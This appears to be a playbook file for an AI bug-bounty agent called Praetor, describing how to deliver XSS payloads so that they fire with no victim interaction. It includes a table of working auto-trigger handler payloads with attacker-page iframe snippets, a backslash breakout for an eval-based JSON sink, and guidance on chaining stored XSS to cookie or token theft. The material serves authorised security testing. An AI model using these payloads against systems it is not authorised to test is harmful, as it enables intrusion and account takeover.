---
description: XSS delivery — turning a reflected/stored payload into a fired alert. No-victim-interaction auto-trigger event matrix (self-firing vs attacker-iframe), where to host the attacker page, and how delivery composes with probe_xss_executed / test_dom_sinks. Load once execution context is confirmed but the payload still needs to fire without a click.
globs:
---

# XSS Delivery Playbook

Finding reflection is not the finding. A triager pays for **execution**, and execution
often needs the payload to fire with no victim interaction — a `click`-gated handler is
usually NEVER-SUBMIT (self-XSS territory, Rule 15). This playbook is the delivery half:
you have a payload that reaches an executable context, now make it fire on its own.

Load when: execution context is confirmed (payload lands in HTML/attribute/JS, not just
text) AND the obvious `onerror`/`onclick`/`onload` is filtered, gated on interaction, or
you need a cross-window trigger. For crafting the breakout itself, see the `xss` and
`dom_xss` knowledge-base contexts; for filter bypass, `payload-crafter`.

## Where to host the attacker page

Praetor has no exploit-server tool. Cross-window delivery (the iframe triggers below)
needs an operator-controlled page that frames the target:

- **OOB confirmation** (blind/stored XSS calling home) → `generate_collaborator_payload()`
  for a real Burp Collaborator subdomain, or `build_encrypted_oast_payload()`. Poll with
  `get_collaborator_interactions`. Never fabricate a callback domain (Rule 9a).
- **The attacker page that frames the target** (the `<iframe>` snippets below) → operator
  hosts it themselves (local file, own VPS, or the platform's exploit server on a bug-bounty
  lab). Praetor does not serve it. Point its `alert()` / `fetch()` at a Collaborator URL so
  the fire is captured as evidence, not just a visual popup.

## Auto-trigger matrix

Two classes. Self-firing handlers need **zero interaction and no attacker page** — they
fire when the injected markup renders, so they work even in stored contexts the victim
merely views. Iframe-triggered handlers fire only when an attacker page frames the target
and manipulates the frame — one visit to the attacker page, still zero clicks on the target.

| Handler | Victim interaction | Attacker page? | How it fires | Payload + trigger |
|---|---|---|---|---|
| `onanimationstart` | none | no | CSS `@keyframes` starts on render | `<style>@keyframes x{...}</style><xss style="animation-name:x" onanimationstart=alert(1)></xss>` |
| `onpageshow` | none | no | fires on load + bfcache restore | `<body onpageshow=alert(1)>` |
| SVG `onbegin` | none | no | SMIL animation begins on render | `<svg><animatetransform onbegin=alert(1) attributeName=transform></svg>` |
| `onhashchange` | none | yes | parent appends `#x` to iframe src | `<body onhashchange=alert(1)>` + `<iframe src="//T/?p=PAYLOAD" onload="this.src+='#x'">` |
| `onresize` | none | yes | parent changes iframe width | `<body onresize=alert(1)>` + `<iframe src="//T/?p=PAYLOAD" onload="setTimeout(()=>this.style.width='100px',1000)">` |
| `onscroll` | none | yes | parent scrolls framed target | `<body onscroll=alert(1)><div style=height:3000px></div>` + `<iframe src="//T/?p=PAYLOAD" onload="this.contentWindow.scrollTo(0,1000)">` |
| `onfocus`+`autofocus` | none | no | element auto-focuses on render | `<input autofocus onfocus=alert(1)>` (already in `xss.json` → attribute) |
| `ontoggle` (`<details open>`) | none | no | open detail auto-toggles | `<details open ontoggle=alert(1)>` (already in `xss.json` → waf_bypass) |
| `onbeforetoggle` (popover) | none | no | popover shows on load | `<button popovertarget=x onbeforetoggle=alert(1)>` (already in `xss.json` → waf_bypass) |

Decision rule:
- **Reflected into a page the victim already loads** → prefer a self-firing handler. No
  second hop, works if the target refuses framing (`X-Frame-Options` / CSP `frame-ancestors`).
- **Stored** → self-firing handler fires for every viewer on render; strongest impact.
- **Reflected but the payload needs a state change to fire** (hash, size, scroll) → use the
  iframe trigger. First check the target is framable: `test_dom_sinks` / an `extract_headers`
  read for `X-Frame-Options` / `Content-Security-Policy: frame-ancestors`. If framing is
  blocked, fall back to a self-firing handler or a `window.open` + fragment variant.

Cross-origin caveat: `contentWindow.scrollTo` and reading frame internals are SOP-blocked
across origins. The `onscroll` fallback is a URL fragment — append `#id` to the iframe src
and give the injected element that `id`; the browser auto-scrolls it into view, firing
`onscroll` without touching `contentWindow`.

## The JSON-into-eval sink (dom_xss → eval_json_response_sink)

Delivery for the reflected-DOM case where a search value is echoed into a JSON response the
client `eval`s: `eval('var x = ' + responseText)` or `eval('('+responseText+')')`.

1. **Confirm the sink, not JSON.parse.** `test_dom_sinks` / `smart_js_analyze` on the JS —
   if the response reaches `JSON.parse` there is no sink, stop.
2. **Fire the backslash breakout.** Payload `\"-alert(1)}//`. The server escapes the `"`
   → `\"` but leaves the attacker's leading `\` alone, so the response carries `\\"` — a
   literal backslash then a string-closing quote. `-alert(1)}` runs, `//` eats the rest.
3. Reflected, not stored → deliver by sending the victim the crafted URL, or auto-navigate
   from an attacker page.

## Composing with the execution-check tools

Delivery is not evidence until something fired. The pipeline:

1. **Reach + reflect** — `auto_probe` (loads `xss` / `dom_xss`; the `auto_trigger_delivery`
   context reflection-scores the handlers above) or `fuzz_parameter` to confirm the payload
   lands unescaped in an executable context.
2. **Prove execution, not reflection** — `probe_xss_executed(url, ...)` drives a real
   browser through the Burp proxy and reports whether the handler actually ran (dialog / sink
   hit), the per-class bar in `verify-finding.md`. Reflection alone is SUSPECTED, never
   CONFIRMED.
3. **DOM-sink tracing** — `test_dom_sinks` maps source→sink for the DOM cases (hash, URL,
   postMessage, the eval-JSON sink) so you deliver into the sink that actually executes.
4. **OOB for blind/stored** — point the handler at a `generate_collaborator_payload()` URL;
   a `get_collaborator_interactions` hit is the fired-in-victim-context proof.
5. **Evidence** — annotate the confirming request (Rule 18), cite its `logger_index` in
   `evidence`. For self-firing handlers the executable reflection is the proof; for
   iframe-triggered ones, capture the attacker page + the Collaborator/console fire.

## Severity + NEVER_SUBMIT

- Fires with **zero interaction** (self-firing, or one attacker-page visit) → legitimate
  reflected/stored XSS, rate on impact per Rule 14b.
- Requires the victim to **paste into devtools / click a 500-char link they must assemble**
  → self-XSS, Rule 15, do not submit.
- Handler reflects but never executes (encoded, wrong context, TT/CSP blocks it) → SUSPECTED,
  escalate or drop to `save_target_notes`, do not save (Rule 14a).
- Stored + self-firing across other users → HIGH+; chain to ATO via cookie/token theft
  (`chain-findings.md`).

## Related

- `knowledge/xss.json` → `auto_trigger_delivery` (this matrix), `attribute` (autofocus/onfocus),
  `waf_bypass` (ontoggle/onbeforetoggle/onformdata/onload)
- `knowledge/dom_xss.json` → `eval_json_response_sink`, `hash_injection`, `url_source`,
  `postmessage_sink`
- `probe_xss_executed` — browser-driven execution proof (not reflection)
- `test_dom_sinks` — source→sink tracing for DOM XSS
- `generate_collaborator_payload` / `build_encrypted_oast_payload` — OOB callback for blind/stored fire
- `verify-finding.md` — per-class evidence bar (XSS needs executable context, not reflection)
- `chain-findings.md` — XSS → ATO / token theft progression
- Rule 9a (OOB via Collaborator only), Rule 14a/14b (no INFO, business-impact severity), Rule 15 (self-XSS gate)
